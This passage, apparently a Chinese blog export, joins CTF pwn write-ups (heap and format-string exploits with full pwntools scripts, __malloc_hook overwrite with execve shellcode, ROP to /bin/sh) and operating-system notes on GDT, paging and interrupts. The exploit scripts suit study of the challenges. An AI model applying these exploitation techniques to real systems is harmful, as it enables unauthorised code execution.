这样后者分配时就会将已写好的地址视为fd的指向,下次申请相同大小的空间时就会先申请fd指向的空间. 最后在malloc_hook注入shellcode地址即可. exp1, 我写了自己的注释 exp2, 是郁离歌师傅的exp, 思路和exp1有所不同, 以后等熟练malloc_hook等的利用方式再对比来看. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#-*-coding:utf8-*-from pwn import *context.terminal = ['tmux','splitw','-h']context.log_level = 'debug'#if args['REMOTE']:#p = remote('183.129.189.62',21904)#else:p = process('./HackNote')def add(size, note): p.sendline('1') p.sendlineafter('Input the Size:', str(size)) p.sendlineafter('Input the Note:', note) #p.recvuntil('Add Done!')def free(index): p.sendline('2') p.sendlineafter('Input the Index of Note:', str(index))def edit(index, new_note): p.sendline('3') p.sendlineafter('Input the Index of Note:', str(index)) p.sendlineafter('Input the Note:', new_note)def debug(): print('malloc_hook 0x6cb788') print('fake_size 0x6cb830') print('fake_top 0x6cc290') print('note_list 0x6CBC40') print('heap 0x6cf870') gdb.attach(p)def pwn(): malloc_hook = 0x6CB788 fake = malloc_hook-0x16 add(0x18,'0\\n') #0 add(0x108,'\\x00'*0xf0+p64(0x100)+'\\n') #1 add(0x100,'2\\n')#2 add(0x10,'3\\n')#3 free(1) edit(0,'0'*0x18) edit(0,'0'*0x18+p16(0x100)) #110 -&gt; 100 add(0x80,'111\\n')#1 add(0x30,'4\\n')#4 add(0x20,'5\\n')#5 free(1) free(2) free(4) #0x6cf8a0 0x6cf9b0 0x6cf930 #chunk overlap, overlap #5-&gt;0x6cf970 #get a chunk which is 0x210 add(0xa0,'0'*0x88+p64(0x41)+p64(fake)+p64(0))#1 #let 0x6cf930 fake add(0x30,'2\\n')#2 #0x6cf930 (0x6cb722 -&gt; 0x6c0032) shellcode=&quot;&quot; shellcode += &quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e&quot; shellcode += &quot;\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f&quot; shellcode += &quot;\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot; add(0x38,'\\x00'*0x6+p64(malloc_hook+8)+shellcode+'\\n') debug() p.interactive()pwn() exp2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *#r=process('./HackNote')r=remote('183.129.189.62',11104)context(arch = 'amd64', os = 'linux')def gd(): gdb.attach(r) pause()def add(size,content): r.sendlineafter('-----------------','1') r.sendlineafter('nput the Size:',str(size)) r.sendafter('he Note:',content)def free(idx): r.sendlineafter('-----------------','2') r.sendlineafter('the Index of Note:',str(idx))def edit(idx,content): r.sendlineafter('-----------------','3') r.sendlineafter('Note',str(idx)) r.sendafter('Input the Note:',content)fake=0x06CBC40free_hook=0x6CD5E8malloc_hook=0x6CB788sc=asm(shellcraft.sh())sc='''xor rdi,rdipush 0x6cbc40pop rsipush 0x100pop rbxpush 0pop raxsyscallpush 0x6cbc40ret'''sc=asm(sc)print shellcraft.sh()print hex(len(sc))add(0xf8,p64(0)+p64(0xf1)+p64(fake-0x18)+p64(fake-0x10)+p64(0)*26+p64(0xf0))#0add(0xf8,'aaaan')#1add(0x38,'bbbbn')#2add(0x50,'ccccn')#3edit(0,'a'*0xf8)edit(0,p64(0xffffffffffffffff)+p64(0xf1)+p64(fake)+p64(fake+8)+p64(0)*26+p64(0xf0)+'x41'+'x01')free(1)add(0xf8,'aaaan')#1add(0x38,p64(malloc_hook-0xe-8)+'n')#4free(2)edit(4,p64(malloc_hook-0xe-8)+'n')add(0x38,p64(malloc_hook-0xe-8)+'n')#2add(0x38,'a'*6+p64(malloc_hook+8)+sc+'n')r.sendline('1')r.recvuntil('Input the Size:n')r.sendline('123')r.sendline(asm(shellcraft.sh()))r.interactive() three 漏洞: 文件读取服务器上的flag 利用姿势: 这种题关键是理解程序逻辑, 注意细节. 一般考虑fsb, 下标越界, 整数溢出等, 只是没想到要植入汇编… 可以类比pwnable.tr上的orw 我一开始被前面出现的一个函数误导了, 天真地以为这里和flag进行对比完之后就可以获取正确flag(逆向思路?) 结果发现最后还是得获取权限… 这个函数长这样 1234567891011121314int sub_0_80488C5(){ int *v1; // [esp+Ch] [ebp-Ch] sub_0_8050890(off_0_80F5438, 0, 2, 0); sub_0_8050890(off_0_80F543C, 0, 2, 0); sub_0_8050890(off_0_80F5434[0], 0, 2, 0); v1 = (int *)sub_0_80505B0((int)&quot;./flag&quot;, (int)&amp;unk_0_80C4788); if ( !v1 ) exit(0); sub_0_80505D0((int)&amp;unk_0_80F6CA0, 1u, 32, v1); sub_0_8050100(v1); return sub_0_8070760(0);} 如果该目录下没有flag这个文件,则直接终止. 所以现在pwn文件同目录中创建一个flag文件. 然后checksec发现没开pie. 函数的主要部分在这 123456789101112131415161718192021222324252627282930313233int sub_0_8048B5C(){ int result; // eax char v1; // [esp-10h] [ebp-38h] int v2; // [esp-Ch] [ebp-34h] int size; // [esp+Ch] [ebp-1Ch] int chr; // [esp+10h] [ebp-18h] void *ptr; // [esp+14h] [ebp-14h] int v6; // [esp+18h] [ebp-10h] unsigned int v7; // [esp+1Ch] [ebp-Ch] v7 = __readgsdword(0x14u); myprint((int)&quot;Give me a index:&quot;); chr = get_the_char(array); ptr = (void *)sub_0_8071C50(0, 0x1000u, 7, 34, 0, 0); myprint((int)&quot;Three is good number,I like it very much!&quot;); read(0, ptr, 3u); myprint((int)&quot;Leave you name of size:&quot;); scanf(&quot;%d&quot;, &amp;size); if ( size &lt; 0 || size &gt; 0x200 ) exit(0); myprint((int)&quot;Tell me:&quot;); read(0, &amp;unk_0_80F6CC0, size - 1); v6 = ((int (__cdecl *)(signed int))ptr)(1); if ( chr == v6 ) result = myprint((int)&quot;1&quot;); else result = myprint((int)&quot;2&quot;); if ( __readgsdword(0x14u) != v7 ) result = sub_0_8073110(v1, v2); return result;} 函数逻辑比较清晰, 就是读三个字节执行，然后和 flag 进行判断。看汇编, 发现这确实是个调用了一个函数. 那就下断点静态调试, 下在0x8048c50, 慢慢过去. 输入如图, 两个字符串分别为abc,cba 看到步进到0x8048c5b的前后对比. eip指向的指令是call eax, 而eax地址内的内容是我们刚输入的 abc,而ecx地址内的内容是刚刚输入的 cba, 所以现在的漏洞利用思路是 将eax转换成一条交换指令, 使ecx地址内的内容和esp交换,而ecx内的内容是我们植入的恶意代码. 12345678910111213141516171819202122from pwn import *context.arch = 'i386'sh = process('./pwn')sh.sendlineafter('index:\\n', str(0))payload = asm('''xchg ecx, espret''')sh.sendafter('much!\\n',payload)sh.sendlineafter('size:\\n',str(0x1ff))layout = [ 0x08072fb1, 0, 0, 0x80f6d00, 0x080c11e6, 11, 0x080738c0, ]sh.sendafter('me:\\n',flat(layout).ljust(0x40, '\\0')+ '/bin/sh\\0')sh.interactive() 这里的限制0x40没去深入理解, 调了发现0x40可以就放着儿了, 清晰点的逻辑也可看下面这个 12345678910111213141516from pwn import *context.log_level = 'debug'#p = process('./pwn')p = remote()p.sendlineafter('Give me a index:','3')migStack = '\\x89\\xcc\\xc3'p.sendafter('Three is good number,I like it very much!',migStack)binsh_len = len('/bin/sh\\x00')pop_ecx_ebx = 0x08072fb2pop_eax_edx_ebx = 0x080568b4int80 = 0x08049903shellcode = p32(pop_ecx_ebx) + p32(0) + p32(0) +p32(pop_eax_edx_ebx) + p32(0xb) + p32(0) + p32(0x80f6ce1) + p32(int80)p.sendlineafter('Leave you name of size:','500')p.sendlineafter('Tell me:',shellcode +'\\x00'+'/bin/sh\\x00')p.interactive()","link":"/2019/11/17/2019-11-17-hxb_and_hmb/"},{"title":"操作系统实现学习笔记(上)","text":"有能力的同学可以直接先看着两个脚本对系统的创建方式有个初步认识.当然是直接建在虚拟机上的,比较简单. Makefile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!MakefileC_SOURCES = $(shell find . -name &quot;*.c&quot;)C_OBJECTS = $(patsubst %.c, %.o, $(C_SOURCES))S_SOURCES = $(shell find . -name &quot;*.s&quot;)S_OBJECTS = $(patsubst %.s, %.o, $(S_SOURCES))CC = gccLD = ldASM = nasmC_FLAGS = -c -Wall -m32 -ggdb -gstabs+ -nostdinc -fno-builtin -fno-stack-protector -I includeLD_FLAGS = -T scripts/kernel.ld -m elf_i386 -nostdlibASM_FLAGS = -f elf -g -F stabsall: $(S_OBJECTS) $(C_OBJECTS) link update_image.c.o: @echo 编译代码文件 $&lt; ... $(CC) $(C_FLAGS) $&lt; -o $@.s.o: @echo 编译汇编文件 $&lt; ... $(ASM) $(ASM_FLAGS) $&lt;link: @echo 链接内核文件... $(LD) $(LD_FLAGS) $(S_OBJECTS) $(C_OBJECTS) -o hx_kernel.PHONY:cleanclean: $(RM) $(S_OBJECTS) $(C_OBJECTS) hx_kernel.PHONY:update_imageupdate_image: sudo mount floppy.img /mnt/kernel sudo cp hx_kernel /mnt/kernel/hx_kernel sleep 1 sudo umount /mnt/kernel.PHONY:mount_imagemount_image: sudo mount floppy.img /mnt/kernel.PHONY:umount_imageumount_image: sudo umount /mnt/kernel.PHONY:qemuqemu: qemu -fda floppy.img -boot a.PHONY:bochsbochs: bochs -f tools/bochsrc.txt.PHONY:debugdebug: qemu -S -s -fda floppy.img -boot a &amp; sleep 1 cgdb -x tools/gdbinit kernel.ld 12345678910111213141516171819202122232425262728293031323334353637383940414243/* * kernel.ld -- 针对 kernel 格式所写的链接脚本 */ENTRY(start)SECTIONS{ /* 段起始位置 */ . = 0x100000; .text : { *(.text) . = ALIGN(4096); } .data : { *(.data) *(.rodata) . = ALIGN(4096); } .bss : { *(.bss) . = ALIGN(4096); } .stab : { *(.stab) . = ALIGN(4096); } .stabstr : { *(.stabstr) . = ALIGN(4096); } /DISCARD/ : { *(.comment) *(.eh_frame) }} 一个操作系统的实现阅读笔记​ 实模式下,段值还是可以看作地址的一部分, 段值为xxxxh表示以xxxx0h开始的一段内存, 而保护模式下, 段值表示为一个索引, 指向一个数据结构的表项, 即GDT/LDT, 它的表项也称描述符(Descriptor). 所以GDT的作用是提供段式存储机制.由段寄存器和GDT中的描述符共同提供的. 物理地址 = 段值 * 16 + 偏移 数据段和代码段描述符 这里写一下描述符的各属性,仅做查询方便之用. P位 存在位. P=1表示段在内存中存在.否则为0 DPL描述符特权级,分0 - 3,数字越小特权级越大. S位指明描述符是数据段/代码段描述符(S=1), 还是系统段/门描述符(S=0) TYPE描述符见下 G位 段界限粒度位, G=0 时段界限粒度为字节,G=1界限粒度为4kb D/B位, 可执行代码段描述符中,是D位, D=1默认情况下用32位地址及32位或8位操作数,D=0时则是16和8. 向下扩展数据段描述符中,为B位,B=1时,段的上部界限为4GB,0时为64kb 描述符堆栈段描述符, 为B位, B=1时, 隐式的堆栈访问指令使用32位堆栈指针寄存器esp,D=0时,用sp. AVL位保留位被系统软件使用. 选择子 TI位是区别GDT选择子和LDT选择子的关键.如果TI被置位,那么系统就从当前LDT中寻找相应描述符. 进入保护模式的步骤: 准备GDT 用lgdt加载gdtr 打开A20 置cr0的PE位 跳转,进入保护模式 $ 表示当前行被汇编后的地址, $$表示程序被汇编后的开始地址. “一致”: 当转移的目标是一个特权级更高的一致代码段,当前的特权级会被延续下去,而向特权级更高的非一致代码段的转移会引起常规保护错误,除非使用调用门或者任务门. 当目标代码的特权级低的话,无论它是不是一致代码段,都不能通过call或者jmp转移进去. 所有的数据段都是非一致的所以不可能被低特权级的代码访问到.但与代码段不同的是, 数据段可以被更高特权级的代码访问到,而不需要特定的门. 补一个汇编的tips: COUNT EQU 100;令COUNT的值为100,存储器中为变量分配 0个字节 COUNT DB 100 ;令COUNT的值为100,存储器中为变量分配 1个字节 COUNT DW 100 ;令COUNT的值为100,存储器中为变量分配 2个字节 count EQU $-ARRA 定义了一个常量，不占用内存单元，代码段中使用它，等价于使用一个立即数。 count DW $-ARRA 定义了一个变量，占用2个字节的内存单元，代码段中使用它，就变成一个[偏移地址]。 字符串处理指令stosb, lodsb, movsw,scasb,rep (1) lodsb、lodsw：把DS:SI指向的存储单元中的数据装入AL或AX，然后根据DF标志增减SI (2) stosb、stosw：把AL或AX中的数据装入ES:DI指向的存储单元，然后根据DF标志增减DI (3) movsb、movsw：把DS:SI指向的存储单元中的数据装入ES:DI指向的存储单元中，然后根据DF标志分别增减SI和DI (4) scasb、scasw：把AL或AX中的数据与ES:DI指向的存储单元中的数据相减，影响标志位，然后根据DF标志分别增减SI和DI (5) cmpsb、cmpsw：把DS:SI指向的存储单元中的数据与ES:DI指向的存储单元中的数据相减，影响标志位，然后根据DF标志分别增减SI和DI (6) rep：重复其后的串操作指令。重复前先判断CX是否为0，为0就结束重复，否则CX减1，重复其后的串操作指令。主要用在MOVS和STOS前。一般不用在LODS前。 上述指令涉及的寄存器：段寄存器DS和ES、变址寄存器SI和DI、累加器AX、计数器CX涉及的标志位：DF、AF、CF、OF、PF、SF、ZF CLD与STD是用来操作方向标志位DF（Direction Flag）。CLD使DF复位，即DF=0，STD使DF置位，即DF=1.用于串操作指令中。 jc = Jump if Carry 当运算产生进位标志时，即CF=1时，跳转到目标程序处。 处理器通过CPL,DPL,RPL三种特权级进行特权级检验.CPL是当前执行的程序或任务的特权级,被存储在cs和ss的第0位和第1位上. 通常CPL随着代码所在段的特权级进行改变,但在当处理器访问一个与CPL特权级不同的一致代码段时,CPL不会被改变. DPL表示段或者门的特权级, 被存储在段描述符或者门描述符的DPL字段中.当当前代码段试图访问一个段或者门时,DPL会和CPL以及段或门选择子的RPL相比较,根据段或者门类型的不同,DPL会被区别对待: 数据段,调用门,TSS规定的是最低特权级, 即 CPL &lt;= DPL 非一致代码段规定的是特权级, 即 CPL = DPL (and RPL小于DPL) 一致代码段和通过调用门访问的非一致代码段规定的是最高特权级, 即CPL &gt;= DPL (不检查RPL) and 特权级值越小说明特权级越高…. RPL通过段选择子的第0位和第1位表现出来的. 处理器通过检查RPL和CPL来确认一个访问请求是否合法. 即两者特权级低的决定了访问的下限.当被调用过程才从调用过程接收到一个选择子时,会把选择子的RPL设成调用者的特权级. 于是当操作系统用这个选择子去访问相应的段时,处理器会用调用过程的特权级RPL,而不是更高的操作系统过程的特权级CPL进行特权检验. 程序控制转移的发生可以由指令jmp,call,ret,sysenter,sysexit,int n,iret或者中断和异常机制引起.转移方式分为两大类,一是通过jmp和call的直接转移,二是通过某个描述符的间接转移. 细分为 目标操作数包含目标代码段的段选择子 目标操作数指向一个包含目标代码段选择子的调用门描述符 目标操作数指向一个包含目标代码段选择子的TSS 目标操作数指向一个任务门,这个任务门指向一个包含目标代码段选择子的TSS 门描述符, 主要是定义目标代码对应段的选择子,入口地址的偏移和一些属性: 门分为调用门,中断门,陷阱门,任务门. 调用门特权级规则如下, 对照着前面的特权级访问规则就很容易明白.这里我们举个例子想由代码A转移到代码B,运用于个调用门G,即调用门G中的目标选择子指向代码B的段. 如果一个调用或跳转指令在段间而不是段内进行的, 那么我们称之为长跳转.长调用如call执行指令时被压栈的不仅有eip,还应该有cs. 每一个任务最多可能在4个特权级转移.所每个任务实际需要4个堆栈,从TSS数据结构获得ss和esp. 下图是32位TSS. 当任务在不同特权级间进行转移的时候, CPU在整个过程中做的工作 根据目标代码段的DPL(新CPL)从TSS中选择应该切换至那个ss和esp 从TSS中读取新的ss和esp,在整个过程中如果发现ss,esp或者TSS界限错误都会导致无效TSS异常. 对ss描述符进行检验,如果发生错误,同样产生#TS异常. 暂时性地保存当前ss和esp的值. 加载新的ss和esp. 将刚保存的ss和esp值压入新栈. 从调用者堆栈中将参数复制到被调用者堆栈中,复制参数的数目由调用门中Param Count一项决定.如果为0则不会复制 将当前的cs和eip压栈. 加载调用门中制定的新的cs和eip,开始执行被调用者过程. 逻辑地址 —(分段机制)—&gt; 线性地址 —(分页机制)—&gt; 物理地址分页机制转换时,先是由寄存器cr3制定的页目录中根据线性地址的高10位得到页表地址,然后在页表地址中根据线性地址的第12到21位得到物理页首地址,将这个首地址加上线性地址第12位就是物理地址.cr0的最高位PG位为1则开启分页机制. PDE结构 1| P | R/W | U/S | PWT | PCD | A | 0 | PS | G | Avail | Page Base-Table Address| 分别对应Present, Read/write. User/Supervisor. Write-through, Cache disabled, Accessd, Reserved, Page size, Global page, Available for system programmer’s use. 页表基址. PTE结构 1| P | R/W | U/S | PWT | PCD | A | D | PAT | G | Avail | Page Base Address| 分别对应Present, Read/write. User/Supervisor. Write-through, Cache disabled, Accessd, Dirty, Page Table Attribute Index , Global page, Available for system programmer’s use. 页基址. cr0 的wp位是supervisor的保护位(CPL &lt; 3 是Supervisor), 当cr0的wp位为0,即使用户页面的R/W=0, 系统级程序耶具备写权限, 如果为1,则系统级程序也不能写入用户级只读页. PWT用于控制单个页或页表的缓冲策略,为0是使用write-back,为1是使用write-through. 当cr0的CD(Cache-Disable)为被设置时会被忽略. PCD用于控制单个页或页表的缓冲,为0时可以被缓冲,为1不可以.同样手cr0的CD位影响. D表示页或页表是否被写入. cr3 指向页目录表, 又叫作PDBR(Page-Directory Base Register), 高20位页目录表首地址的高20位,页目录表首地址的低12位会是0(4kb 对齐). tips: es:edi指向页目录表的开始, 具体见下, 当第一个PDE赋值时,循环已经开始,es:edi每次循环会自动指向下一个PDE 或者PTE的首地址. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253; 启动分页机制 --------------------------------------------------------------SetupPaging: ; 根据内存大小计算应初始化多少PDE以及多少页表 xor edx, edx mov eax, [dwMemSize] mov ebx, 400000h ; 400000h = 4M = 4096 * 1024, 一个页表对应的内存大小 div ebx mov ecx, eax ; 此时 ecx 为页表的个数，也即 PDE 应该的个数 test edx, edx jz .no_remainder inc ecx ; 如果余数不为 0 就需增加一个页表.no_remainder: push ecx ; 暂存页表个数 ; 为简化处理, 所有线性地址对应相等的物理地址. 并且不考虑内存空洞. ; 首先初始化页目录 mov ax, SelectorPageDir ; 此段首地址为 PageDirBase mov es, ax xor edi, edi xor eax, eax mov eax, PageTblBase | PG_P | PG_USU | PG_RWW.1: stosd add eax, 4096 ; 为了简化, 所有页表在内存中是连续的. loop .1 ; 再初始化所有页表 mov ax, SelectorPageTbl ; 此段首地址为 PageTblBase mov es, ax pop eax ; 页表个数 mov ebx, 1024 ; 每个页表 1024 个 PTE mul ebx mov ecx, eax ; PTE个数 = 页表个数 * 1024 xor edi, edi xor eax, eax mov eax, PG_P | PG_USU | PG_RWW.2: stosd add eax, 4096 ; 每一页指向 4K 的空间 loop .2 mov eax, PageDirBase mov cr3, eax mov eax, cr0 or eax, 80000000h mov cr0, eax jmp short .3.3: nop ret; 分页机制启动完毕 ---------------------------------------------------------- 分页机制: 利用中断15h可以检测机器的内存. eax设为0E820h, 调用后为’SMAP’ ebx放置后续值(为等到下一个地址描述符所需要的后续值) es:di指向一个地址范围描述符结构ARDS ecx位BIOS填充在地址范围描述符的字节数量20字节. ead 0534D4150h(‘SMAP’),BIOS使用此标志对调用者请求的系统映像信息进行校验, 这些信息被BIOS放置到es:di所指向的结构中 ARDS(Address Range Descriptor Structure)的结构 123456偏移 名称 意义 0 BaseAddrLow 基地址的低32位 4 BaseAddrHigh 基地址的高32位 8 LengthLow 长度的低32位 12 LengthHigh 长度的高32位 16 Type 这个地址范围的地址类型 分页机制可以达到的效果: 先执行某线性地址处的模块, 然后通过改变cr3来转换地址映射关系,在执行同一个线性地址处的模块. 因地址映射已经改变, 所以两次输出不同. 中断保护模式下中断机制变化, 中断单向量表被IDT代替, IDT中断描述符, 分为中断门,陷阱门,任务门, 作用是将每一个中断向量和一个描述符对应起来. 中断分为不可屏蔽中孤单(NMI)和可屏蔽中断, 分别由CPU的两根引脚NMI和INTR来接收, NMI中断对应的中断向量号通常为2, 其中可屏蔽中断与CPU的关系是通过可编程中断控制器8259A建立起来的. 对他的设置通过相应端口写入特定ICW实现. OCW有三个,通常用于以下情况: 屏蔽或打开外部中断; 向8259A写入OCW1. 其实是写入了IMR(主动屏蔽器) 发送EOI给8259A已通知它中断处理结束. 通过向端口20h或者A0h写OCW2实现. 中断或异常发生时的堆栈变化, 没有特权级变换时eflags, cs, eip, (错误码)将一次被压入堆栈, 否则先押入ss和esp. 从中断或异常返回时必须使用指令iretd. 它在返回的同时改变eflags的值. 但是只有当CPL为0时, eflags的IOPL域才会改变,当CPL &lt;= IOPL时, IF才会被改变. 当iretd执行时要先将Error Code主动清除. 通过中断门向量引起的中断会复位IF, 因为可以避免其他中断干扰当前中断的处理. 随后的iret指令会从堆栈上恢复IF的原置,而通过陷阱门产生的中断不会改变IF. IOPL是 I/O 保护机制的关键之一, 位于寄存器eflags的第12,13位. eflags图如下, I/O敏感指令只有在CPL&lt;&lt;IOPL时才能执行. popf和iretd可以改变IOPL指令, 运行在ring0程序才能将其改变. popf同时可以改变IF.但是要求CPL&lt;=IOPL. 加载一个文件入内存的话,读软盘时要使用到BIOS中断int 13h, 用法如下: 在将控制权由loader交给内核之前的内存使用分布示意图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869;*************************************************************** ; 内存看上去是这样的： ; ┃ ┃ ; ┃ . ┃ ; ┃ . ┃ ; ┃ . ┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; ┃■■■■■■Page Tables■■■■■■┃ ; ┃■■■■■(大小由LOADER决定)■■■■┃ ; 00101000h ┃■■■■■■■■■■■■■■■■■■┃ PageTblBase ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; 00100000h ┃■■■■Page Directory Table■■■■┃ PageDirBase &lt;- 1M ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ ; F0000h ┃□□□□□□□System ROM□□□□□□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ ; E0000h ┃□□□□Expansion of system ROM □□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ ; C0000h ┃□□□Reserved for ROM expansion□□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ B8000h ← gs ; A0000h ┃□□□Display adapter reserved□□□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ ; 9FC00h ┃□□extended BIOS data area (EBDA)□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; 90000h ┃■■■■■■■LOADER.BIN■■■■■■┃ somewhere in LOADER ← esp ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; 80000h ┃■■■■■■■KERNEL.BIN■■■■■■┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; 30000h ┃■■■■■■■■KERNEL■■■■■■■┃ 30400h ← KERNEL 入口 (KernelEntryPointPhyAddr) ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃ ┃ ; 7E00h ┃ F R E E ┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃■■■■■■■■■■■■■■■■■■┃ ; 7C00h ┃■■■■■■BOOT SECTOR■■■■■■┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃ ┃ ; 500h ┃ F R E E ┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃□□□□□□□□□□□□□□□□□□┃ ; 400h ┃□□□□ROM BIOS parameter area □□┃ ; ┣━━━━━━━━━━━━━━━━━━┫ ; ┃◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇◇┃ ; 0h ┃◇◇◇◇◇◇Int Vectors◇◇◇◇◇◇┃ ; ┗━━━━━━━━━━━━━━━━━━┛ ← cs, ds, es, fs, ss ; ; ; ┏━━━┓ ┏━━━┓ ; ┃■■■┃ 我们使用 ┃□□□┃ 不能使用的内存 ; ┗━━━┛ ┗━━━┛ ; ┏━━━┓ ┏━━━┓ ; ┃ ┃ 未使用空间 ┃◇◇◇┃ 可以覆盖的内存 ; ┗━━━┛ ┗━━━┛ ; ; 注：KERNEL 的位置实际上是很灵活的，可以通过同时改变 LOAD.INC 中的 ; KernelEntryPointPhyAddr 和 MAKEFILE 中参数 -Ttext 的值来改变。 ; 比如把 KernelEntryPointPhyAddr 和 -Ttext 的值都改为 0x400400， ; 则 KERNEL 就会被加载到内存 0x400000(4M) 处，入口在 0x400400。 ;; ------------------------------------------------------------------------ 如图, 0x90000开始的63kb留给了Loader.bin, 0x80000开始的64kb留给了Kernel.bin, 0x30000开始的32kb留给整理后的内核.而页目录和页表被放置在了1mb以上的内存空间. 在进程切换过程中,esp的位置出现在3个不同的区域. 进程栈,进程表(也可称进程控制块PCB),内核栈. 进程表通常由一个结构体(这里是一个s_proc)定义较为方便管理. 保存进程的状态. 一个进程的启动过程:经历的过程: 进程体 –&gt; 初始化GDT中的TSS和LDT两个进程符 –&gt; 初始化TSS –&gt; 准备进程表 –&gt; 完成跳转,实现ring0-&gt;ring1. 一个进程开始之前必须初始化的寄存器: cs, ds, es, fs, gs, ss, esp, eip, eflags. 进程开始之前的核心内容和关系可以分为三个部分: 进程表和GDT. 进程表内的LDT selector对应GDT中的一个描述符,而这个描述符所指向的内存空间就在这个进程表内. 进程表和进程. GDT和TSS. GDT中需要一个描述符对应TSS, 并且初始化它. 进程表需要初始化的主要有3部分: 寄存器, LDT Selector, LDT. 多进程中断重入 , 因为CPU在相应中断的过程中会自动关闭中断, 需要人为地打开中断, 加入sti指令, 然后, 要保证中断处理过程足够长, 以至于在它完成之前会有下一个中断产生, 在中断处理例程中调用一个延迟函数. 即中断嵌套. 先列一下多进程的步骤: 在task_table中增加一项,即多一项任务内容 让NR_TASKS加一, 即进程数量加一 定义任务堆栈. 修改STACK_SIZE_TOTAL 添加新任务执行体的函数声明 这里再补充一下进程切换的内容有助于理解: clockhander: 一个操作系统的运转过程(例子): 计数器的工作原理: 有一个输入频率如1193180Hz,在每一个时钟周期(CLK cycle),计数器值会减一,当减到0时,就会触发一个输出,如果计数器是16位的,则最大值为65535,默认的时钟中断发生频率就是1193180/65536 约等于 18.2Hz. 我们可以通过改变计数器的计数值来控制频率(时间间隔). shell的实现(tty)屏幕显示字符常用的汇编语句是 123mov ah, 0Ch ; 0000:黑底 1100:红字mov al, 'P'mov [gs:edi], ax 其实看张图就明白, 字符对应的字节和位定义如下: tty的任务框架: TTY任务开始运行时, TTY都被初始化, nr_current_console会被赋值为0,然后持续循环.而对于每一个TTY,首先执行tty_do_read(), 然后调用keyboard_read()并将读入的字符交给函数in_process()来处理,如果是需要输出的字符,会被in_process()放入当前接受处理的TTY的缓冲区中,然后tty_do_write()会被接着执行,如果缓冲区中有数据,则被送入out_char显示出来. 注意区分用户进程和任务","link":"/2019/10/31/2019-10-31-kernel/"},{"title":"SWPUCTF赛题复现","text":"没时间写mobile，reverse的了，但不得不说比赛很舒适，题目质量都不错 pwnlogin 漏洞类型：格式化字符串漏洞，bss段数组泄露栈信息 利用思路：通过泄露__libc_start_main来泄露libc地址，再rop 先来看眼题目： 程序保护只开了nx，：） 这里比较明显的是个格式化字符串漏洞，比较特殊的是那个format是在bss段上的，但是我们一样可以通过它泄露栈上的信息 因为主体还是栈题，所以我们的初步构想是先泄露libc地址，那在printf处下断点，到上图的printf处查看栈的分布。 发现可以泄露__libc_start_main+241的地址，因为这个地址实在libc段上的，所以可计算得出libc基地址，同时泄露ebp地址，为了待会构造rop用。他们距离格式化字符串的偏移分别为15和6 在得到libc基地址和ebp，顺便得到ret地址后，我们开始构造rop 这里使用system和binsh得到权限。思路是ret位置填上三个pop和一个ret的gadget（为什么这么做，看下去就知道了，初步原因是因为我们之前得到的ebp内的地址（old ebp）距离ebp为4个地址单位） 然后在old ebp后的old ret处填上我们shellcode的地址（system地址），再在后面填上新ret地址和binsh地址。这里其实也有队伍直接在最初的ret地址处直接上system地址，据说也可获得权限。。。但这里还是按照程序流来做。 [+] ebp: 0xffffd718 [+] target_addr（ret地址）: 0xffffd70c [+] libc: 0xf7dfa000 [+] system: 0xf7e36d10 [+] binsh: 0xf7f758cf 这是得到的五个地址，可以帮助理解下面的内容。 一开始的栈布局 然后根据程序，先输入一个地址做输入地址，再往这个地址输入数据，这样重复构造完成rop. 这是输入完三个pop和一个ret地址的gadget地址后的布局，为什么要这么做呢，其实是因为我们old ebp距离ebp的位置有四个地质单元，所以我们要再原先leave ebp，esp，pop ebp之后，再pop三次，然后在地址0xffffd71c 处标为ret地址，使ip指向system函数地址 最后完成rop构造的布局，其中0xffffd720应该是新ret的地址没什么用，0xffffd724是binsh地址 官方魔改的exp， 这里的offset1和offset2是根据在read函数下断点，然后在查看它的栈结构得到的偏移值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#!/usr/bin/python2.7 # -*- coding: utf-8 -*-from pwn import *context.log_level = &quot;debug&quot;context.arch = &quot;i386&quot;context.terminal = ['tmux','splitw','-h']elf = ELF(&quot;login&quot;)def exp(): sh = process(&quot;./login&quot;) lib = ELF(&quot;./bc.so.6&quot;) sh.sendlineafter(&quot;:&quot;,&quot;a&quot;) payload = '%6$pAA%15$pBB\\x00' #gdb.attach(sh) sh.sendlineafter(&quot;:&quot;,payload) sh.recvuntil(&quot;0x&quot;) ebp = int(sh.recvuntil(&quot;AA&quot;,True),16) print hex(ebp) print 'ebp =&gt; ',hex(ebp) target_addr = ebp - (0xffe54918 - 0xffe5490c) libc = int(sh.recvuntil(&quot;BB&quot;,True),16) - 0x18e81#lib.symbols['__libc_start_main'] - 241 print 'libc =&gt; ', 